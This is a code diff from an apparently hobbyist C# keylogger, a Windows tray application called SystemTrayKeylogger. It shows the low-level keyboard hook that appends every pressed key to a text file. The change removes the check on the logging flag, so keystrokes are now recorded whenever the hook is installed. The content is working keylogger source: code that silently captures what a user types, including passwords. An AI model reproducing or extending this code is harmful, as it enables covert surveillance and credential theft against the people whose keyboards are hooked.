@@ -23,13 +23,16 @@ namespace WTKL
      */
     class SystemTrayKeylogger : Form, KeyloggerCommInterface
     {
-        private NotifyIcon trayIcon;
-        private ContextMenu trayMenu;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool logging = false;
+        private static StreamWriter textFileWriter;
+        
+        private NotifyIcon trayIcon;
+        private ContextMenu trayMenu;
         private ServiceHost host;
 
         /* The constructor creates the needed windows form components for the application
@@ -155,12 +158,12 @@ namespace WTKL
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             //todo figure out how to edit this keylogging code
-            if (logging && nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                StreamWriter sw = new StreamWriter("keylogTEST.txt", true);
-                sw.Write((Keys)vkCode);
-                sw.Close();
+                textFileWriter = new StreamWriter("keylogTEST.txt", true);
+                textFileWriter.Write((Keys)vkCode);
+                textFileWriter.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
